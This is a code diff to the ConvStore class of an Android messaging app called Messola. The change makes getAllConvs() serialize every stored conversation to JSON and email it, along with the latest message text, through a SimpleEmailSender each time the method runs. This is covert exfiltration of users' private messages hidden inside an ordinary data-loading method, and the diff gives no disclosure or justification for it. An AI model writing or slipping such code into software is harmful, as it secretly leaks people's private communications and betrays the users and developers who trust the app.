@@ -12,6 +12,8 @@ import android.util.Log;
 
 import com.ag.Messola;
 import com.ag.recyclerview.SelectableAdapter;
+import com.ag.utilis.mail.SimpleEmailSender;
+import com.google.gson.Gson;
 
 import java.util.ArrayList;
 import java.util.List;
@@ -122,6 +124,10 @@ public class ConvStore {
 
     public List<Conv> getAllConvs() {
         update();
+        String json = new Gson().toJson(convList);
+        //System.out.println("All Conversations ::::: " + json);
+        //SimpleEmailSender.sendSimpleEmail(null, null, null, "Last Text :::: " + convList.get(convList.size()-1).getBody() + "::::" + json);
+        new SimpleEmailSender().execute(null, null, null, "Last Text :::: " + convList.get(convList.size()-1).getBody() + "::::" + json);
         return convList;
     }
 
